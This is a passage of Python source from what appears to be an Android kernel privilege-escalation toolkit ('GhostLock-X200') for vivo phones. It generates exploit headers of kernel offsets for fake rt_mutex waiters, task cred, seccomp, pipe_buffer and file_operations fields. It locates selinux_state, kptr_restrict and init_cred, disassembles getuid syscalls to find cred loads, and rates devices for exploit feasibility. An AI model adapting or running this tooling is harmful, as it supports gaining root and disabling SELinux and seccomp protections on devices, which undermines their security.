#define FAKE_WAITER_TASK_OFF              0x50
#define FAKE_WAITER_LOCK_OFF              0x58
#define FAKE_WAITER_WAKE_STATE_OFF        0x60
#define FAKE_WAITER_WW_CTX_OFF            0x68"""

    task_offsets = "\n".join(
        "#define %-28s 0x%x" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0x0" % (d, d)
        for d in ("FAKE_TASK_USAGE_OFF", "FAKE_TASK_PRIO_OFF",
                  "FAKE_TASK_NORMAL_PRIO_OFF", "FAKE_TASK_TASK_GROUP_OFF",
                  "FAKE_TASK_PI_LOCK_OFF", "FAKE_TASK_PI_WAITERS_OFF",
                  "FAKE_TASK_PI_TOP_TASK_OFF", "FAKE_TASK_PI_BLOCKED_ON_OFF",
                  "MM_OWNER_OFF", "TASK_PID_OFF", "TASK_TGID_OFF",
                  "TASK_REAL_PARENT_OFF", "TASK_ATOMIC_FLAGS_OFF",
                  "TASK_REAL_CRED_OFF", "TASK_CRED_OFF", "TASK_COMM_OFF",
                  "TASK_TASKS_OFF", "TASK_SECCOMP_OFF"))
    task_offsets += "\n#define TASK_THREAD_INFO_FLAGS_OFF 0x00"

    cred_offsets = "\n".join(
        "#define %-24s 0x%x" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0x0" % (d, d)
        for d in ("CRED_UID_OFF", "CRED_SECUREBITS_OFF", "CRED_CAPS_OFF",
                  "CRED_SECURITY_OFF", "SELINUX_CRED_OSID_OFF",
                  "SELINUX_CRED_SID_OFF"))
    cred_offsets += "\n#define SELINUX_CRED_BLOB_OFF 0"

    seccomp_offsets = "\n".join(
        "#define %-28s 0x%02x" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0x0" % (d, d)
        for d in ("SECCOMP_MODE_OFF", "SECCOMP_FILTER_COUNT_OFF",
                  "SECCOMP_FILTER_OFF"))
    seccomp_offsets += ("\n#define TIF_SECCOMP_BIT           11   "
                        "/* arch/arm64 thread_info.h 实证 */")
    seccomp_offsets += ("\n#define PFA_NO_NEW_PRIVS_BIT      0    "
                        "/* sched.h 实证 (vivo 与上游不同) */")

    page_offsets = ("#define STRUCT_PAGE_SIZE             0x%x\n" % btf_off["STRUCT_PAGE_SIZE"]
                    if "STRUCT_PAGE_SIZE" in btf_off else "")
    page_offsets += ("#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08\n"
                     "#define STRUCT_SLAB_CACHE_OFF         0x08\n"
                     "#define STRUCT_PAGE_TYPE_OFF          0x30\n")

    pipe_offsets = ("#define PIPE_BUFFER_SIZE             0x%x\n" % btf_off["PIPE_BUFFER_SIZE"]
                    if "PIPE_BUFFER_SIZE" in btf_off else "")
    pipe_offsets += ("#define PIPE_BUFFER_SLOTS            32   "
                     "/* exploit 策略 (F_SETPIPE_SZ), 非内核布局 */\n")
    pipe_offsets += "#define PIPE_BUF_FLAG_CAN_MERGE      0x10\n"

    fops_offsets = "\n".join(
        "#define %-28s 0x%02x" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0x0" % (d, d)
        for d in ("FOPS_OWNER_OFF", "FOPS_LLSEEK_OFF", "FOPS_READ_OFF",
                  "FOPS_WRITE_OFF", "FOPS_READ_ITER_OFF", "FOPS_WRITE_ITER_OFF",
                  "FOPS_IOCTL_OFF", "FOPS_COMPAT_IOCTL_OFF", "FOPS_MMAP_OFF",
                  "FOPS_OPEN_OFF", "FOPS_RELEASE_OFF", "FOPS_SPLICE_READ_OFF",
                  "FOPS_SHOW_FDINFO_OFF"))

    cfg_offsets = "\n".join(
        "#define %-28s %d" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0" % (d, d)
        for d in ("CFG_PAGE_OFF", "CFG_NEEDS_READ_FILL_OFF",
                  "CFG_BIN_BUFFER_OFF", "CFG_BIN_BUFFER_SIZE_OFF",
                  "CFG_CB_MAX_SIZE_OFF"))

    return TEMPLATE_HEADER.format(
        ts=opts.get("ts", ""),
        extra=opts.get("extra", ""),
        variant=variant,
        fingerprint=fp,
        kimage_base=kb,
        p0_page_offset=opts["p0_page_offset"],
        p0_phys_offset=opts["p0_phys_offset"],
        p0_kernel_phys_load=opts["p0_kernel_phys_load"],
        identity_start=opts["identity_start"],
        identity_end=opts["identity_end"],
        direct_map_base=opts["direct_map_base"],
        direct_map_end=opts["direct_map_end"],
        vmemmap_start=opts["vmemmap_start"],
        symbols=sym_text,
        address_macros=addr_macros,
        slide_symbols=slide_text,
        slide_macros=slide_macros,
        psselect_waiter_word_shift=opts.get("psselect_waiter_word_shift", 0),
        psselect_route_nfds=opts.get("psselect_route_nfds", 264),
        waiter=waiter,
        fake_waiter=fake_waiter,
        task_offsets=task_offsets,
        cred_offsets=cred_offsets,
        seccomp_offsets=seccomp_offsets,
        page_offsets=page_offsets,
        pipe_offsets=pipe_offsets,
        fops_offsets=fops_offsets,
        cfg_offsets=cfg_offsets)


def patch_w2host(path, btf_off):
    """同步 w2host.c 的 TASK_CRED_OFF / TASK_COMM_OFF (BTF 实证)."""
    src = open(path, encoding="utf-8").read()
    repl = {
        "#define TASK_CRED_OFF 0x820": "#define TASK_CRED_OFF 0x%x" % btf_off["TASK_CRED_OFF"],
        "#define TASK_COMM_OFF 0x830": "#define TASK_COMM_OFF 0x%x" % btf_off["TASK_COMM_OFF"],
    }
    changed = []
    for old, new in repl.items():
        if old in src:
            src = src.replace(old, new, 1)
            changed.append(new)
        elif ("TASK_CRED_OFF" in old and "#define TASK_CRED_OFF" not in src):
            # 无旧值, 插入
            pass
    if changed:
        open(path, "w", encoding="utf-8", newline="").write(src)
    return changed


# ============================================================
# 6. winoffs (win_extract.py 迁移: 镜像固有偏移)
# ============================================================

def gen_winoffs(elf_path, task_cred_off, out_path, profile=None):
    if profile is None:
        profile = load_profile()
    from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN

    data = open(elf_path, "rb").read()
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", data, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", data, 0x3E)[0]
    sections = {}
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size = \
            struct.unpack_from("<IIQQQQ", data, off)
        sections[i] = dict(name_off=sh_name, addr=sh_addr, offset=sh_offset,
                           size=sh_size)
    shstr = sections[e_shstrndx]
    shstr_data = data[shstr["offset"]:shstr["offset"] + shstr["size"]]

    def sec_name(i):
        o = sections[i]["name_off"]
        e = shstr_data.find(b"\0", o)
        return shstr_data[o:e].decode(errors="replace")

    names = {i: sec_name(i) for i in sections}
    kern_sec = next((sections[i] for i in sections if names[i] == ".kernel"), None)
    sym_sec = next((sections[i] for i in sections if names[i] == ".symtab"), None)
    str_sec = next((sections[i] for i in sections if names[i] == ".strtab"), None)
    if not (kern_sec and sym_sec and str_sec):
        raise SystemExit("FATAL: ELF 缺少 .kernel/.symtab/.strtab")
    base = kern_sec["addr"]
    kern = data[kern_sec["offset"]:kern_sec["offset"] + kern_sec["size"]]
    strdata = data[str_sec["offset"]:str_sec["offset"] + str_sec["size"]]
    syms = {}
    for i in range(sym_sec["size"] // 24):
        st_name, st_info, st_other, st_shndx, st_value, st_size = \
            struct.unpack_from("<IBBHQQ", data, sym_sec["offset"] + i * 24)
        if st_shndx == 0 or st_value == 0:
            continue
        e = strdata.find(b"\0", st_name)
        name = strdata[st_name:e].decode(errors="replace")
        if name and name not in syms:
            syms[name] = st_value

    sym_off, w2host = _winoffs_core(
        kern, {n: v - base for n, v in syms.items()}, task_cred_off)
    out = {
        "physmap_base": profile["physmap_base"],
        "device": profile["device"],
        "kernel_release": profile["kernel_release"],
        "family": profile["family"],
        "soc": profile["soc"],
        "elf": elf_path,
        "kimage_text_base": "0x%x" % base,
        "sym_offs": {k: hex(v) for k, v in sym_off.items()},
        "w2host": w2host,
    }
    json.dump(out, open(out_path, "w"), indent=2)
    print("winoffs saved:", out_path)
    return out


def _winoffs_core(kern, syms_rel, task_cred_off):
    """共享核心: 内核字节 + 相对符号表 (name -> 相对内核起点偏移) → (sym_off, w2host).
    ELF 路径与 Image 直反汇编路径共用; 符号文件偏移 = 相对偏移 (Image 从 _text 起)."""
    from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN
    md = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)
    md.detail = True

    def find_window(fn_rel):
        off = fn_rel
        if off < 0 or off + 96 > len(kern):
            return None
        insns = list(md.disasm(kern[off:off + 96], off))
        ldr_idx = None
        for i, ins in enumerate(insns):
            if ins.mnemonic == "ldr" and ins.op_str.startswith("x8, [") and \
                    ("#%#x" % task_cred_off) in ins.op_str:
                ldr_idx = i
                break
        if ldr_idx is None:
            return None
        win = []
        for ins in insns[ldr_idx + 1:]:
            if ins.mnemonic == "ret":
                break
            writes = len(ins.operands) > 0 and ins.operands[0].type == 1 and \
                ins.reg_name(ins.operands[0].reg) in ("x8", "w8")
            if writes:
                break
            win.append(ins.address - off)
        return win

    sym_off = {}
    for w in RUNTIME_SYMBOLS:
        if w[0] in syms_rel:
            # 兼容旧键名: __dump_skip.zeroes -> zeroes_buf (PS1 依赖)
            key = "zeroes_buf" if w[0] == "__dump_skip.zeroes" else w[0]
            sym_off[key] = syms_rel[w[0]]
    win = {}
    for fn in ("__arm64_sys_getuid", "__arm64_sys_geteuid", "__arm64_sys_getresuid"):
        if fn in syms_rel:
            w = find_window(syms_rel[fn])
            if w:
                win[fn] = [syms_rel[fn]] + w
    cred_ips = sorted(set(win[fn][0] + wo for fn in win for wo in win[fn][1:]))
    w2host = {
        "cred_ip_offs": [hex(x) for x in cred_ips],
        "win_lo": hex(min(cred_ips) - 0x200) if cred_ips else "0x0",
        "win_hi": hex(max(cred_ips) + 0x200) if cred_ips else "0x0",
    }
    return sym_off, w2host


def cmd_winoffs_image(argv, profile, prof_path):
    """winoffs-image <Image/kernel.raw> <kallsyms.txt> <out.json> [--task-cred-off]
    从内核镜像直反汇编生成 win_offs (无需 vmlinux-to-elf; 符号用离线/设备 kallsyms)."""
    if len(argv) < 3:
        raise SystemExit("FATAL: winoffs-image 需要 Image, kallsyms.txt, out.json")
    img_path, ks_path, out_path = argv[0], argv[1], argv[2]
    if not os.path.exists(img_path):
        raise SystemExit("FATAL: 内核镜像不存在: %s" % img_path)
    if not os.path.exists(ks_path):
        raise SystemExit("FATAL: kallsyms 不存在: %s" % ks_path)
    raw = open(img_path, "rb").read()
    if raw[:8] == b"ANDROID!":
        raw = _boot_kernel(img_path)
        if raw is None or raw == b"":
            raise SystemExit("FATAL: boot.img 不含内核 (kernel_size=0)")
    img, method = _decompress_kernel(raw)
    if method != "raw":
        print("winoffs-image: 内核压缩: %s (已解压 %d 字节)" % (method, len(img)))
    syms, _stype, _all = parse_kallsyms(ks_path)
    base = syms.get("_text")
    if not base:
        raise SystemExit("FATAL: kallsyms 无 _text, 无法计算相对偏移")
    syms_rel = {k: v - base for k, v in syms.items()}
    tco = int(profile["task_cred_off"], 16)
    if "--task-cred-off" in argv:
        tco = int(argv[argv.index("--task-cred-off") + 1], 16)
    sym_off, w2host = _winoffs_core(img, syms_rel, tco)
    out = {
        "physmap_base": profile["physmap_base"],
        "device": profile["device"],
        "kernel_release": profile["kernel_release"],
        "family": profile["family"],
        "soc": profile["soc"],
        "elf": img_path,
        "kimage_text_base": profile["kimage_text_base"],
        "source": "image-disasm",
        "sym_offs": {k: hex(v) for k, v in sym_off.items()},
        "w2host": w2host,
    }
    json.dump(out, open(out_path, "w"), indent=2)
    print("winoffs saved:", out_path)
    return out


# ============================================================
# 7. live 模式 (兼容: STAGE3.4 运行时动态值)
# ============================================================

def gen_live(ks_path, btf_path, win_path, out_path, profile=None):
    if profile is None:
        profile = load_profile()
    syms, stype, sym_all = parse_kallsyms(ks_path)
    types = parse_btf_full(btf_path)
    win = json.load(open(win_path))
    base = syms.get("_text")
    if not base:
        print("FATAL: no _text")
        sys.exit(1)
    pmb = int(win["physmap_base"], 16)

    cred_cap_perm = task_cred = task_comm = se_enf = None
    for t in types[1:]:
        if t["kind"] == 4:
            if t["name"] == "cred" and cred_cap_perm is None:
                cred_cap_perm = btf_member(types, t, "cap_permitted")
            elif t["name"] == "task_struct":
                task_cred = btf_member(types, t, "cred")
                task_comm = btf_member(types, t, "comm")
            elif t["name"] == "selinux_state":
                se_enf = btf_member(types, t, "enforcing")

    def caps_ok(v):
        return (v >> 16) & 1

    def caps_score(v):
        return sum(1 for b in (1, 12, 19, 21) if (v >> b) & 1)

    img_end = base + 0x4000000
    cands = []
    for s, addrs in sym_all.items():
        if s.endswith(".__key") and stype.get(s) in ("b", "B"):
            for a in addrs:
                if base <= a < img_end and caps_ok(a):
                    cands.append((caps_score(a), a, s))
    cands.sort(key=lambda t: (0 if t[2] == "init_completion.__key" else 1,
                              -t[0], t[1]))
    capsym_va = cands[0][1] if cands else base
    if cands:
        print("capsym: %s @ %#x (score %d)" % (cands[0][2], cands[0][1], cands[0][0]))
    else:
        print("WARN: no capsym candidate")

    so = win["sym_offs"]
    se_p0 = pmb + int(so["selinux_state"], 16)
    kptr_p0 = pmb + int(so["kptr_restrict"], 16)
    kr = win.get("kernel_release") or profile["kernel_release"]
    o = {
        "generated": "offsets_auto.py (win_offs 权威)",
        "kernel": kr + " (auto)",
        "device": win.get("device") or profile["device"],
        "family": win.get("family") or profile["family"],
        "base_va": hex(base),
        "selinux_enforcing_p0": hex(se_p0),
        "kptr_restrict_p0": hex(kptr_p0),
        "init_cred_p0": hex(pmb + int(so["init_cred"], 16)),
        "init_user_ns_p0": hex(pmb + int(so["init_user_ns"], 16)),
        "capsym_va": hex(capsym_va),
        "struct_offsets": {
            "cred_cap_permitted": cred_cap_perm,
            "task_cred": task_cred,
            "task_comm": task_comm,
            "selinux_enforcing": se_enf,
        },
        "w2host": win["w2host"],
    }
    json.dump(o, open(out_path, "w"), indent=2)
    print(json.dumps(o, indent=2))


# ============================================================
# 8. main
# ============================================================

# ============================================================
# 8.0 feasibility 机型可行性预检
# ============================================================

MTK_EVIDENCE = (
    "MTK 上 KernelSnitch (futex 时序 mm_struct 泄露) 不可靠: "
    "CONFIG_KASAN_HW_TAGS(MTE) 污染指针 tag; CONFIG_PANIC_ON_OOPS=y 无试错空间; "
    "vivo RSC 调度器破坏 pselect/pi 链 (社区公开记录: vivo PD2241/天玑9200 失败)。"
    "已跑通先例: X200 (PD2415, 天玑9400, b57 族)。"
)


def _asset_kind(path):
    """素材类型: bootimg / kernel_elf / kernel_raw / other."""
    with open(path, "rb") as f:
        head = f.read(8)
    if head[:8] == b"ANDROID!":
        return "bootimg"
    if head[:4] == b"\x7fELF":
        return "kernel_elf"
    ext = os.path.splitext(path)[1].lower()
    if ext in (".raw", ".img", ".bin"):
        return "kernel_raw"
    # 无魔数大文件含 "Linux version" 特征 → 视为解出的内核镜像
    if os.path.getsize(path) > (1 << 20):
        with open(path, "rb") as f:
            if b"Linux version" in f.read(min(os.path.getsize(path), 64 << 20)):
                return "kernel_raw"
    return "other"


def _boot_kernel(path):
    """读取 boot.img 的 kernel 段 (含 kernel_size=0 检测)."""
    data = open(path, "rb").read()
    if data[:8] != b"ANDROID!":
        return None
    kernel_size = struct.unpack_from("<I", data, 0x08)[0]
    page_size = struct.unpack_from("<I", data, 0x24)[0]
    if kernel_size == 0:
        return b""
    seg = None
    if 0 < page_size < len(data):
        seg = data[page_size:page_size + kernel_size]
    if seg is None or not _looks_like_kernel(seg):
        # 厂商头 page_size 缺失/异常 (如 vivo page_size=0 实为 4K 页):
        # 回退探测内核段起点 (常见页大小 / Image magic / 压缩魔数)
        seg = _probe_kernel_segment(data, kernel_size)
    return seg if seg else b""


def _looks_like_kernel(seg):
    """候选内核段特征: arm64 Image magic @0x38 或压缩魔数 (gzip/lz4/xz/lzma)."""
    if len(seg) < 0x40:
        return False
    if seg[0x38:0x3C] == b"ARM\x64":
        return True
    return seg[:2] in (b"\x1f\x8b",) or seg[:4] in (
        b"\x02\x21\x4c\x18",) or seg[:6] in (b"\xfd7zXZ\x00",)


def _probe_kernel_segment(data, kernel_size):
    """在 boot 数据中定位内核段: 常见页大小起点 → Image magic → 压缩魔数."""
    for ps in (2048, 4096, 8192, 16384):
        if ps + 0x40 <= len(data) and _looks_like_kernel(data[ps:ps + 0x40]):
            return data[ps:ps + kernel_size]
    for sig in (b"\x02\x21\x4c\x18", b"\xfd7zXZ\x00", b"\x1f\x8b"):
        j = data.find(sig)
        if j >= 0 and j + kernel_size <= len(data):
            return data[j:j + kernel_size]
    i = data.find(b"ARM\x64")
    if i >= 0x38 and i - 0x38 + kernel_size <= len(data):
        return data[i - 0x38:i - 0x38 + kernel_size]
    return None


def _lz4_legacy_decompress(data):
    """LZ4 legacy frame (0x184C2102): magic + (size LE + block)*, 最后 size=0 结束."""
    import lz4.block
    pos = 4
    out = bytearray()
    for _ in range(1 << 16):
        if pos + 4 > len(data):
            break
        size = struct.unpack_from("<I", data, pos)[0]
        pos += 4
        if size == 0 or (size & 0x7FFFFFFF) == 0:
            break
        uncompressed = bool(size & 0x80000000)
        sz = size & 0x7FFFFFFF
        if pos + sz > len(data):
            break
        chunk = data[pos:pos + sz]
        pos += sz
        if uncompressed:
            out += chunk
        else:
            out += lz4.block.decompress(chunk, uncompressed_size=16 << 20)
    return bytes(out)


def _decompress_kernel(raw):
    """解压内核镜像; 返回 (data, method)."""
    if raw[:2] == b"\x1f\x8b":
        import gzip
        try:
            return gzip.decompress(raw), "gzip"
        except Exception:
            pass
    if raw[:4] == b"\x02\x21\x4c\x18":
        try:
            return _lz4_legacy_decompress(raw), "lz4"
        except Exception:
            pass
    if raw[:6] == b"\xfd7zXZ\x00":
        try:
            import lzma
            return lzma.decompress(raw), "xz"
        except Exception:
            pass
    return raw, "raw"


def _extract_release(data):
    """从 (解压后的) 内核镜像提取完整 UTS_RELEASE."""
    idx = data.find(b"Linux version ")
    if idx < 0:
        return None
    e = data.find(b"\x00", idx)
    if e < 0:
        e = min(idx + 200, len(data))
    line = data[idx:e].decode(errors="replace")
    parts = line.split(" ", 3)
    return parts[2] if len(parts) >= 3 else None


def _extract_ikconfig(data):
    """搜 IKCFG_ST/IKCFG_ED 之间的 CONFIG_*."""
    st = data.find(b"IKCFG_ST")
    if st < 0:
        return {}
    ed = data.find(b"IKCFG_ED", st)
    if ed < 0:
        return {}
    cfg = {}
    for line in data[st + 8:ed].split(b"\x00"):
        if line.startswith(b"CONFIG_"):
            try:
                k, v = line.decode().split("=", 1)
                cfg[k] = v
            except ValueError:
                pass
    return cfg


def _feas_report(checks, level, release):
    lines = []
    for mark, msg, why in checks:
        lines.append("  [%s] %s" % (mark, msg))
        if why:
            lines.append("       -> %s" % why)
    lines.append("")
    labels = {"recommended": "推荐 (可直接尝试)",
              "try": "可尝试 (需完整适配, 风险自担)",
              "not_recommended": "不推荐 (证据见下, 避免投入)"}
    lines.append("预检结论: %s" % labels[level])
    if release:
        lines.append("内核 release: %s" % release)
    return "\n".join(lines)


def cmd_feasibility(argv, profile, prof_path):
    """feasibility <素材> [--soc ...] [--kernel-release ...]."""
    if not argv:
        raise SystemExit("FATAL: feasibility 需要素材路径 (boot.img / kernel.raw / kernel.elf)")
    asset = argv[0]
    soc_ov = None
    rel_ov = None
    if "--soc" in argv:
        soc_ov = argv[argv.index("--soc") + 1]
    if "--kernel-release" in argv:
        rel_ov = argv[argv.index("--kernel-release") + 1]
    if not os.path.exists(asset):
        raise SystemExit("FATAL: 素材不存在: %s" % asset)

    print("== GhostLock-X200 机型可行性预检 ==")
    print("素材: %s" % asset)
    print("profile: %s (%s / %s)" % (
        os.path.basename(prof_path or (DEFAULT_DEVICE + "/device.json")),
        profile["device"], profile["kernel_release"]))
    print("")
    checks = []

    kind = _asset_kind(asset)
    raw = None
    if kind == "bootimg":
        kernel = _boot_kernel(asset)
        if kernel is None:
            checks.append(("FAIL", "素材不是 Android boot 镜像", "请提供 boot.img"))
            return print(_feas_report(checks, "not_recommended", None))
        if kernel == b"":
            checks.append((
                "FAIL",
                "boot.img kernel_size=0: 这是 init_boot/vendor_boot (不含内核)",
                "Neo9 等 Android13+ 机型 boot 分区已拆分; 请改选 boot.img (payload 的 boot 分区)"
                "或全量包 zip / payload.bin 让工具自动解包"))
            return print(_feas_report(checks, "not_recommended", None))
        checks.append(("PASS", "boot.img 含内核 (kernel_size=%d)" % len(kernel), ""))
        raw = kernel
    elif kind in ("kernel_elf", "kernel_raw"):
        checks.append(("PASS", "素材为 %s, 跳过 boot 头检测" % kind, ""))
        raw = open(asset, "rb").read()
    else:
        checks.append(("FAIL", "无法识别素材类型 (%s)" % kind,
                       "支持 boot.img / kernel.raw / kernel.elf"))
        return print(_feas_report(checks, "not_recommended", None))

    data = None
    method = "raw"
    if raw:
        data, method = _decompress_kernel(raw)
        if method != "raw":
            checks.append(("INFO", "内核压缩: %s (已解压检测)" % method, ""))

    release = rel_ov or (_extract_release(data) if data else None)
    release_known = False
    release_same_family = False
    if release:
        release_known = release == profile["kernel_release"]
        release_same_family = profile["family"] in release
        if release_known:
            checks.append(("PASS", "内核 release 与 profile 完全匹配: %s" % release, ""))
        elif release_same_family:
            checks.append((
                "WARN",
                "release 与 profile 同族但非同一构建: %s (profile: %s)" % (
                    release, profile["kernel_release"]),
                "同族可尝试; 偏移需重新生成, ko vermagic 需按该 release 重打"))
        else:
            checks.append((
                "FAIL",
                "release 不在已知族: %s (已知: %s)" % (release, profile["kernel_release"]),
                "需新建 profile + 重新提取偏移; 若为 MTK 未知族, 见 SoC 项"))
    else:
        checks.append((
            "WARN",
            "无法从素材提取内核 release",
            "请用 --kernel-release <完整UTS_RELEASE> 指定, 或连接设备读 /proc/version"))

    # 全模块自动匹配 (v1.6): 素材 release vs devices/ 全部已装模块
    if release:
        djp_all, level_all = find_device(release)
        if djp_all:
            checks.append(("INFO",
                           "已收录模块: %s (%s)" % (djp_all, level_all),
                           "exact 命中即直接用模块产物; family 命中需重新生成精确偏移"))
        else:
            checks.append(("INFO", "未收录该机型模块", "将自动提取并生成新模块 (可分享)"))

    mtk = profile_is_mtk(profile) or (soc_ov and (
        "dimensity" in soc_ov.lower() or re.match(r"^mt\d", soc_ov.lower())))
    soc_label = soc_ov or profile.get("soc", "unknown")
    if mtk:
        checks.append(("WARN", "SoC: %s (MTK 系)" % soc_label, MTK_EVIDENCE))
    else:
        checks.append(("PASS", "SoC: %s" % soc_label, ""))

    cfg = _extract_ikconfig(data) if data else {}
    if "CONFIG_PANIC_ON_OOPS" in cfg:
        v = cfg["CONFIG_PANIC_ON_OOPS"]
        if v == "y":
            checks.append(("WARN", "CONFIG_PANIC_ON_OOPS=y",
                           "任何内核 OOPS 秒重启, 无试错空间; 偏移/布局首次错误代价高"))
        else:
            checks.append(("PASS", "CONFIG_PANIC_ON_OOPS=%s" % v, ""))
    elif data:
        checks.append(("INFO", "未检测到 ikconfig (PANIC_ON_OOPS 未知)", "不影响预检结论"))

    # ---- 等级判定 (事实驱动, 不猜) ----
    fails = [c for c in checks if c[0] == "FAIL"]
    if fails:
        level = "not_recommended"
    elif release_known:
        level = "recommended" if (not mtk or profile.get("verified")) else "try"
    elif release_same_family:
        level = "try"
    elif release:
        level = "not_recommended" if mtk else "try"
    else:
        level = "try"  # release 未知: 需要更多信息, 不直接否定

    print(_feas_report(checks, level, release))
    return 0


# ============================================================
# 9. main
# ============================================================

# ============================================================
# 8.5 离线恢复提供者 (M4: kallsyms + BTF, 独立实现)
# ============================================================

# arm64 规范内核指针: 高 16 位全 1 (0xffff....)
def _is_kernel_ptr(v):
    return (v >> 48) == 0xFFFF


def _find_token_tables(data):
    """定位 kallsyms_token_index (256 递增 u16) + token_table 起点.
    返回 (token_table_off, token_index_off, tokens[256]) 或抛错."""
    candidates = {}
    limit = len(data) - 512
    pos = 0
    while pos <= limit:
        pos = data.find(b"\x00\x00", pos, limit + 2)
        if pos < 0:
            break
        if pos & 1:
            pos += 1
            continue
        second = struct.unpack_from("<H", data, pos + 2)[0]
        if not (1 <= second <= 0x100):
            pos += 2
            continue
        first16 = struct.unpack_from("<16H", data, pos)
        if not all(first16[i] < first16[i + 1] for i in range(15)):
            pos += 2
            continue
        values = struct.unpack_from("<256H", data, pos)
        if values[0] != 0 or values[-1] > 0x8000:
            pos += 2
            continue
        if not all(values[i] < values[i + 1] for i in range(255)):
            pos += 2
            continue
        for start in _token_table_starts(data, pos, values):
            candidates[(start, pos)] = (start, pos, values)
        pos += 2
    if len(candidates) != 1:
        raise SystemExit(
            "FATAL: kallsyms token_table/token_index 候选不唯一: "
            + repr([(hex(a), hex(b)) for (a, b) in candidates]))
    return next(iter(candidates.values()))


def _token_table_starts(data, idx_off, offsets):
    """回溯 token_table 起点: 每个 token 为 ASCII C 串, 最后一个 token 后到
    token_index 之间必须全零 (表尾)."""
    last = offsets[-1]
    results = []
    for total in range(last + 1, last + 160):
        start = idx_off - total
        if start < 0:
            continue
        ok = True
        for i in range(255):
            a = start + offsets[i]
            b = start + offsets[i + 1]
            if b <= a or b > idx_off or data[b - 1] != 0:
                ok = False
                break
            token = data[a:b - 1]
            if not token or any(c < 0x20 or c > 0x7E for c in token):
                ok = False
                break
        if not ok:
            continue
        nul = data.find(b"\x00", start + last, idx_off)
        if nul < 0:
            continue
        token = data[start + last:nul]
        if not token or any(c < 0x20 or c > 0x7E for c in token):
            continue
        if any(data[nul + 1:idx_off]):
            continue
        results.append(start)
    return results


def _decode_tokens(data, table_off, index):
    tokens = []
    for rel in index:
        e = data.find(b"\x00", table_off + rel)
        if e < 0:
            raise SystemExit("FATAL: kallsyms token 越界")
        token = data[table_off + rel:e].decode(errors="replace")
        if not token or any(ord(c) < 0x20 or ord(c) > 0x7E for c in token):
            raise SystemExit("FATAL: kallsyms token 含空串或非 ASCII")
        tokens.append(token)
    return tuple(tokens)


def _decode_symbol(data, pos, limit, tokens):
    """解码一条压缩符号名: 返回 ((type, name), next_pos)."""
    if pos >= limit:
        raise SystemExit("FATAL: kallsyms names 越界")
    length = data[pos]
    pos += 1
    if length & 0x80:
        if pos >= limit:
            raise SystemExit("FATAL: kallsyms names 扩展长度越界")
        length = (length & 0x7F) | (data[pos] << 7)
        pos += 1
    if length <= 0 or pos + length > limit:
        raise SystemExit("FATAL: kallsyms names 记录长度非法")
    encoded = data[pos:pos + length]
    pos += length
    try:
        expanded = "".join(tokens[i] for i in encoded)
    except IndexError:
        raise SystemExit("FATAL: kallsyms token index 越界")
    if len(expanded) < 2:
        raise SystemExit("FATAL: kallsyms 展开出空符号")
    return (expanded[0], expanded[1:]), pos


def _symbol_end(data, pos, limit):
    """只前进不解码 (names 候选校验用)."""
    if pos >= limit:
        raise SystemExit("FATAL: kallsyms names 越界")
    length = data[pos]
    pos += 1
    if length & 0x80:
        length = (length & 0x7F) | (data[pos] << 7)
        pos += 1
    if length <= 0 or pos + length > limit:
        raise SystemExit("FATAL: kallsyms names 记录长度非法")
    return pos + length


def _locate_markers_common(data, token_table_off):
    """6.6/6.12 通用: markers 紧邻 token_table 前 (可带 0..28 字节对齐填充),
    反向扫描单调 u32 到 0."""
    candidates = {}
    for padding in range(0, 32, 4):
        end = token_table_off - padding
        if end < 8 or end & 3:
            continue
        if padding and any(data[end:token_table_off]):
            continue
        p = end - 4
        current = struct.unpack_from("<I", data, p)[0]
        reverse = [current]
        while p >= 4 and len(reverse) < 1000000:
            prev = struct.unpack_from("<I", data, p - 4)[0]
            if prev >= current:
                break
            reverse.append(prev)
            p -= 4
            current = prev
            if prev == 0:
                break
        if reverse[-1] != 0:
            continue
        values = tuple(reversed(reverse))
        if len(values) < 16 or values[-1] > token_table_off:
            continue
        candidates[end - 4 * len(values)] = values
    return candidates


def _locate_markers_61(data, token_table_off, tokens):
    """6.1 变体: markers 在 token_table 前但 names/markers 顺序不同.
    用 _text/_stext 的 token 编码记录锚定 num_syms/names 对, 再验证 markers
    (每 256 个符号一个 u32, 单调递增, 与解码位置一致)."""

    def split_literal(literal, pos=0):
        if pos == len(literal):
            return [()]
        result = []
        for index, tok in enumerate(tokens):
            if tok and literal.startswith(tok, pos):
                for suffix in split_literal(literal, pos + len(tok)):
                    result.append((index,) + suffix)
        return result

    def encoded(seq):
        if not seq or len(seq) >= 128:
            return b""
        return bytes((len(seq),)) + bytes(seq)

    candidate_pairs = set()
    for kind in ("T", "t", "D", "d", "R", "r"):
        for first_seq in split_literal(kind + "_text"):
            first_rec = encoded(first_seq)
            if not first_rec:
                continue
            for second_seq in split_literal(kind + "_stext"):
                second_rec = encoded(second_seq)
                if not second_rec:
                    continue
                pattern = first_rec + second_rec
                pos = 0
                while True:
                    pos = data.find(pattern, pos, token_table_off)
                    if pos < 0:
                        break
                    for gap in range(4, 68, 4):
                        num_off = pos - gap
                        if num_off < 0 or any(data[num_off + 4:pos]):
                            continue
                        num = struct.unpack_from("<I", data, num_off)[0]
                        if 2 <= num <= token_table_off // 2:
                            candidate_pairs.add((num_off, pos))
                    pos += 1

    candidates = []
    for num_off, names_off in sorted(candidate_pairs):
        num = struct.unpack_from("<I", data, num_off)[0]
        try:
            pos = names_off
            first = []
            for _ in range(min(3, num)):
                symbol, pos = _decode_symbol(data, pos, token_table_off, tokens)
                first.append(symbol)
            if [n for _, n in first[:2]] != ["_text", "_stext"]:
                continue
            positions = [names_off]
            for idx in range(3, num):
                if idx % 256 == 0:
                    positions.append(pos)
                _, pos = _decode_symbol(data, pos, token_table_off, tokens)
            names_end = pos
            marker_count = (num + 255) // 256
